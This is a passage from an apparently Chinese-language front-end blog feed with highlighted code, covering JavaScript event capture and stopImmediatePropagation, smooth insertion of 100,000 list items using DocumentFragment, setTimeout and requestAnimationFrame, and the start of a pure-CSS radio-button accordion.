class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#a</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">background</span>: pink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#b</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">background</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#c</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">background</span>: yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>),</span><br><span class="line">  b = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;b&quot;</span>),</span><br><span class="line">  c = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">c.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;c1&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">c.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;c2&quot;</span>);</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">b.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">a.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a1&quot;</span>);</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br><span class="line">a.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a2&quot;</span>)</span><br><span class="line">&#125;);</span><br><span class="line">a.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a3&quot;</span>);</span><br><span class="line">  event.<span class="title function_">stopImmediatePropagation</span>();</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br><span class="line">a.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a4&quot;</span>);</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://i.loli.net/2019/12/22/hoH2GmXdFjUz8We.png" alt=""></p><p>当我们点击最内层的元素 c 时，输出的结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a1</span><br><span class="line">a3</span><br></pre></td></tr></table></figure><p>当用户点击了最内层的元素 a 时，事件流首先进行捕获，查看父级元素上是否有设置捕获阶段触发的函数，然后依次触发父级元素上在事件捕获阶段所触发的事件。但是当进行到 <code>event.stopImmediatePropagation()</code> 这一行时，该方法阻断了接下来所有事件的执行，因此事件触发到此结束，a 元素上绑定的事件并没有被触发，更不用说事件冒泡阶段所触发的事件了，整体的流程如下：</p><p><img src="https://i.loli.net/2019/12/22/1ALgT84EPrHyUzm.png" alt=""></p><p>当我们去掉 <code>event.stopImmediatePropagation()</code> 时，事件就按照正常的顺序被触发，具体的流程如下：</p><p><img src="https://i.loli.net/2019/12/22/fQnXJ14VzM7msTI.png" alt=""></p><p>还有值得一提的时，我们可以看到最内层的元素 a 身上也绑定了两个事件，其中一个事件开启了事件捕获，那么当我们点击元素 a 本身的时候，其会按照事件顺序去触发事件，其触发事件的顺序并非与是否开启事件捕获相关。<strong>第三个参数所决定的永远只是当前绑定的事件被动触发的时机，而当事件被主动触发时，时按照书写顺序触发事件的</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 温故知新 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用requestAnimationFrame平滑无卡顿插入100000条数据</title>
      <link href="/2019/12/72deb3dba25b.html"/>
      <url>/2019/12/72deb3dba25b.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>网页回流与重绘有时可能会比 JS 的执行消耗更长的时间，比如插入十万条数据，这可能是一个伪需求，但是也是一个值得思考的命题。接下来我们的例子中的 html 都用如下的结构，点击页面按钮后，将 100000 个 <code>li</code> 插入到 <code>ul</code> 中去：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;pushLi()&quot;</span>&gt;</span>添加数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们先来看一下直接暴力插入 100000 条数据的写法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">pushLi</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> startTime = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">valueOf</span>()</span><br><span class="line">  <span class="keyword">const</span> count = <span class="number">100000</span></span><br><span class="line">  <span class="keyword">const</span> ul = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;ul&quot;</span>)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line">    li.<span class="property">innerText</span> = <span class="title class_">Math</span>.<span class="title function_">random</span>() * count</span><br><span class="line">    ul.<span class="title function_">appendChild</span>(li)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">valueOf</span>() - startTime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击按钮，页面大概消耗了 5s 的时间才把内容渲染出来，但是我们看控制台打印出的时间差只有 1s 左右。</p><p><img src="https://i.loli.net/2019/12/02/a6gsRlMCG5jmk9p.png" alt=""></p><p>这是因为浏览器本身存在优化机制，如果没进行一次 <code>appendChild</code> 操作就渲染一次页面，那么就要渲染十万次页面，这样是非常消耗性能的。所以浏览器就会将渲染任务缓存到队列中，在一定的范围内将页面的所有操作合并为一个渲染操作。但是十万条数据仍是一个庞大的数据，因此就会出现 js 已经计算完成，但是渲染仍为完成的情况，此时页面会卡住不动。</p><h1 id="2-初级优化"><a href="#2-初级优化" class="headerlink" title="2. 初级优化"></a>2. 初级优化</h1><p><code>document.createDocumentFragment()</code> 可以创建一个片段，这个片段并没有插入的 DOM 结构中，因此就省去了 DOM 查询的步骤，我们将创建的 <code>li</code> 没次都插入到 <code>fragment</code> 中，而不是每次都插入页面的 DOM 中，最后再将 fragment 插入到页面的 <code>ul</code> 中，这样的话就能一定程度提升 js 运算的性能，从而优化整体效果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">pushLi</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> startTime = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">valueOf</span>()</span><br><span class="line">  <span class="keyword">const</span> count = <span class="number">100000</span></span><br><span class="line">  <span class="keyword">const</span> ul = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;ul&quot;</span>)</span><br><span class="line">  <span class="keyword">const</span> fragment = <span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>()</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line">    li.<span class="property">innerText</span> = <span class="title class_">Math</span>.<span class="title function_">random</span>() * count</span><br><span class="line">    fragment.<span class="title function_">appendChild</span>(li)</span><br><span class="line">  &#125;</span><br><span class="line">  ul.<span class="title function_">appendChild</span>(fragment)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">valueOf</span>() - startTime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在控制台中查看打印的时间差，可以发现 JS 的执行速度提升了一倍：</p><p><img src="https://i.loli.net/2019/12/02/m9awpHG2cKPbBdf.png" alt=""></p><p>那么渲染速度是否会因此提升呢？很遗憾并不，渲染仍在消耗相同的时间，因为我们最终插入页面的数据仍然是十万条，对于浏览器页面来说，仍是一次渲染十万条数据。</p><h1 id="3-节流插入"><a href="#3-节流插入" class="headerlink" title="3. 节流插入"></a>3. 节流插入</h1><p>我们换一种思路，既然一次插入 100000 条数据会给浏览器造成巨大的压力，那么每次只要少渲染一点不久可以了吗。比如说我们在 100ms 渲染 100 条数据，十万条数据分 1000 次插入，也就是耗时 1000 * 100s，虽然耗时相比之下长了，但是页面不卡顿了，用户点击之后马上就可以看到数据，同时数据也在不断增长，直到十万条数据都出来，浏览器便可以停止渲染，这比让用户盯着屏幕卡顿 10 秒的效果好的多。</p><p>于是我们来优化一下写法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">pushLi</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> ul = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;ul&quot;</span>)</span><br><span class="line">  <span class="keyword">const</span> total = <span class="number">100000</span></span><br><span class="line">  <span class="keyword">const</span> once = <span class="number">100</span></span><br><span class="line">  <span class="keyword">const</span> loopCount = total / once</span><br><span class="line">  <span class="keyword">let</span> countOfRender = <span class="number">0</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 每 100 毫秒添加 100 条 li</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> fragment = <span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>()</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; once; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>)</span><br><span class="line">        li.<span class="property">innerText</span> = <span class="title class_">Math</span>.<span class="title function_">random</span>() * total</span><br><span class="line">        fragment.<span class="title function_">appendChild</span>(li)</span><br><span class="line">      &#125;</span><br><span class="line">      ul.<span class="title function_">appendChild</span>(fragment)</span><br><span class="line">      <span class="comment">// 当前渲染到第几次</span></span><br><span class="line">      countOfRender += <span class="number">1</span></span><br><span class="line">      <span class="comment">// 如果没有渲染完成就递归再渲染一次</span></span><br><span class="line">      <span class="keyword">if</span> (countOfRender &lt; loopCount) &#123;</span><br><span class="line">        <span class="title function_">add</span>()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">add</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/02/1tZNFeqbydKLRV2.gif" alt=""></p><p>这样页面就不会卡顿了，但是这样的渲染并没有用到浏览器的性能极限。想想假如我们要想提高渲染效率，要从哪里下手呢？就是去将每次渲染的间隔时间尽量最小化，我们上面的例子使用了 100ms 这其实是不够极限的，只要时间段够短并且浏览器能渲染得过来，那就是合理的。那么最小到哪个阈值呢，我们都知道大部分屏幕的刷新率是 60hz 也就是每秒刷新 60 次，对于我们页面来说极限就是每秒渲染 60 次。我们用 100/60 得出每间隔 16ms 刷新一次是浏览器显示的极限，我们可以将 <code>setTimeout</code> 的时间间隔设置为 16 即可。</p><p>但是当我得意的将 <code>setTimeout</code> 的延时设置为 16ms 时突然发现事情并不对… …</p><p><img src="https://i.loli.net/2019/12/02/2P7WbHKjuGx4MUd.png" alt=""></p><p>发现改为了 16ms 之后，按理说，数据增长应该是平滑的，然而改了之后还是跟之前一样数据是一卡一卡的。emmmm，我知道 setTimeout 有最小值，查了一下最小值为 4ms，这也不对啊。上 MDN 查阅了一下发现了一篇文章 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/setTimeout#%E5%AE%9E%E9%99%85%E5%BB%B6%E6%97%B6%E6%AF%94%E8%AE%BE%E5%AE%9A%E5%80%BC%E6%9B%B4%E4%B9%85%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%9A%E6%9C%80%E5%B0%8F%E5%BB%B6%E8%BF%9F%E6%97%B6%E9%97%B4">实际延时比设定值更久的原因：最小延迟时间</a>。</p><p>MDN 告诉我们，多次嵌套 <code>setTimeout</code> 可能会导致计时器的时间推迟。我们添加一个记录值，来记录上次渲染结束到本次渲染结束的时间间隔，也就是实际 setTimeout 延迟的时间，发现果然随着嵌套的深度，延迟执行的时间越来越长：</p><p><img src="https://i.loli.net/2019/12/03/uOM1wCa4cFpsg9b.png" alt="刚开始的耗时"></p><p><img src="https://i.loli.net/2019/12/03/iRrIjK9nA6Sadyv.png" alt="当嵌套越来越深时"></p><p>所以为了避免嵌套，那么我们就只能利用异步编程，来逐个循环执行定时器了，改写一下我们之前写好的方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">pushLi</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> ul = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;ul&quot;</span>)</span><br><span class="line">  <span class="keyword">const</span> total = <span class="number">100000</span></span><br><span class="line">  <span class="keyword">const</span> once = <span class="number">20</span></span><br><span class="line">  <span class="keyword">const</span> loopCount = total / once</span><br><span class="line">  <span class="keyword">let</span> countOfRender = <span class="number">0</span></span><br><span class="line">  <span class="comment">// 执行定时器的方法改写为一个 promise </span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> fragment = <span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>()</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; once; i++) &#123;</span><br><span class="line">          <span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>)</span><br><span class="line">          li.<span class="property">innerText</span> = <span class="title class_">Math</span>.<span class="title function_">random</span>() * total</span><br><span class="line">          fragment.<span class="title function_">appendChild</span>(li)</span><br><span class="line">        &#125;</span><br><span class="line">        ul.<span class="title function_">appendChild</span>(fragment)</span><br><span class="line">        countOfRender += <span class="number">1</span></span><br><span class="line">        <span class="title function_">resolve</span>()</span><br><span class="line">      &#125;, <span class="number">16</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 专门用来执行循环的函数</span></span><br><span class="line">  <span class="comment">// 当执行完一个定时器后再开启一个新的定时器，所以定时器之间不存在嵌套</span></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">loop</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">add</span>()</span><br><span class="line">    <span class="keyword">if</span> (countOfRender &lt; loopCount) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(countOfRender);</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">loop</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">loop</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这下就好多了，当渲染到第 287 次的时候，仍能保持时间间隔为 34ms。可以看出就算定时器没有嵌套，也会出现数据越多定时器的耗时间隔越长的情况。我分析可能会是这两个原因：要么是由于时间间隔过短，渲染没有跟上速度，导致了执行被阻塞，越来越往后推；要么是页面中还有定时器影响着新定时器的执行速度。</p><p><img src="https://i.loli.net/2019/12/03/aiKUjVTt5uGYDJ7.png" alt=""></p><h1 id="4-requestAnimationFrame"><a href="#4-requestAnimationFrame" class="headerlink" title="4. requestAnimationFrame"></a>4. requestAnimationFrame</h1><p>终于到了我们的主客 <code>requestAnimationFrame</code>，其实原理跟我们上面讲的几乎是一摸一样，但是 <code>requestAnimationFrame</code> 提供了一种更优雅的方式，以及更好的优化性能，我们将上面的定时器改为 <code>requestAnimationFrame</code>，方法就变成了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">pushLi</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> total = <span class="number">100000</span></span><br><span class="line">  <span class="keyword">const</span> once = <span class="number">20</span></span><br><span class="line">  <span class="keyword">const</span> loopCount = total / once</span><br><span class="line">  <span class="keyword">let</span> countOfRender = <span class="number">0</span></span><br><span class="line">  <span class="keyword">let</span> ul = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;ul&quot;</span>)</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> fragment = <span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; once; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>)</span><br><span class="line">      li.<span class="property">innerText</span> = <span class="title class_">Math</span>.<span class="title function_">random</span>() * total</span><br><span class="line">      fragment.<span class="title function_">appendChild</span>(li)</span><br><span class="line">    &#125;</span><br><span class="line">    ul.<span class="title function_">appendChild</span>(fragment)</span><br><span class="line">    countOfRender += <span class="number">1</span></span><br><span class="line">    <span class="title function_">loop</span>()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">loop</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (countOfRender &lt; loopCount) &#123;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(add)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">loop</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这感觉，丝滑般流畅：</p><p><img src="https://i.loli.net/2019/12/03/K8YNJ9ZkdtsObSG.gif" alt=""></p><p>但是，使用 <code>requestAnimationFrame</code> 也会出现后期时间间隔边长，也就是帧率变低的情况，也许就是因为页面数据过多造成性能的上不足导致的，但是相比与纯定时器，效果会更好一丢丢：</p><p><img src="https://i.loli.net/2019/12/03/puX2Uh6t8nHbIP7.png" alt="requestAnimationFrame 在 1100 次渲染时的耗时间隔"></p><p><img src="https://i.loli.net/2019/12/03/iq3aeGwyQpcE6lf.png" alt="setTimeout 在 1100 次渲染时的耗时间隔"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>开脑洞：纯CSS实现一个手风琴效果</title>
      <link href="/2019/12/2880889a30c0.html"/>
      <url>/2019/12/2880889a30c0.html</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在研究CSS选择器的时候，突然想到实现单个展开的手风琴效果很像 <code>radio</code> 组件，即单项选择组件，他们都是选择一个进入 selected 状态后，其他元素的 selected 状态就被取消。所以，对于表单的 <code>radio</code> 组件我们可以利用 CSS 伪类选择器 <code>:selected</code> 来检测其是否被选中。我们在 <code>radio</code> 旁边加一个兄弟节点作为手风琴面板展开显示的内容，默认设置为 <code>display: none</code>，然而当 <code>radio</code> 被选中后，就将其兄弟节点显示为 <code>display: block</code>。</p><p>同时，使用 <code>label</code> 标签，可以扩展 <code>radio</code> 组件的可选范围，使用 <code>visibility: hidden</code> 或者 <code>display: none</code> 可以隐藏原有的 <code>input</code> 标签样式。我们可以将 <code>label</code> 作为被点击对象的实例，而隐藏原有的 <code>input</code>，这样就可以进行美化。或者为 <code>input</code> 添加一个 <code>::after</code> 伪类元素，也可以起到同样的效果。</p><h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><p>我们按照上面的设想，实现一个简单的原型：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.content</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">40px</span>;</span><br><span class="line">  <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:checked</span>+<span class="selector-class">.content</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;selector&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;radio-1&quot;</span>&gt;</span>选择<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;radio-1&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">    这是一串内容</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;selector&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;radio-2&quot;</span>&gt;</span>选择<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;radio-2&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">    这是一串内容</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;selector&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;radio-3&quot;</span>&gt;</span>选择<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span 